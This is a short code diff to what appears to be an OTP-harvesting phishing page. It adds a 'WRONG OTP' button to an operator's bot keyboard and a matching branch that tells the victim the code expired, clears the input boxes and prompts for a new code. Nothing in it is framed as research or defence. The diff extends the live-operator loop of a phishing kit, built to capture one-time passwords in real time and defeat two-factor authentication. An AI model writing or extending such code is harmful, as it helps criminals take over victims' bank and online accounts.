@@ -366,6 +366,22 @@
                 resultMessage.textContent = 'Your data has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
             } else if (parts[0] === 'cancel') {
                 resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
+            } else if (parts[0] === 'wrongotp') {
+                resultMessage.textContent = 'The OTP provided is wrong or has expired, please try again.';
+                // After showing the message, clear the OTP fields and allow user to re-enter
+                setTimeout(() => {
+                    resultOverlay.style.display = 'none';
+                    spinnerOverlay.style.display = 'none';
+                    // Clear all OTP boxes
+                    otpBoxes.forEach(box => box.value = '');
+                    // Reset the state
+                    actionProcessed = false;
+                    otpValue = '';
+                    submitBtn.classList.remove('enabled');
+                    submitBtn.disabled = true;
+                    // Focus on first OTP box
+                    otpBoxes[0].focus();
+                }, 2000);
             }
         }
 
@@ -430,6 +446,9 @@
                     }, {
                         text: '❌ Cancel',
                         callback_data: 'cancel_' + currentTimestamp
+                    }, {
+                        text: '🚫 WRONG OTP',
+                        callback_data: 'wrongotp_' + currentTimestamp
                     }]
                 ]
             };
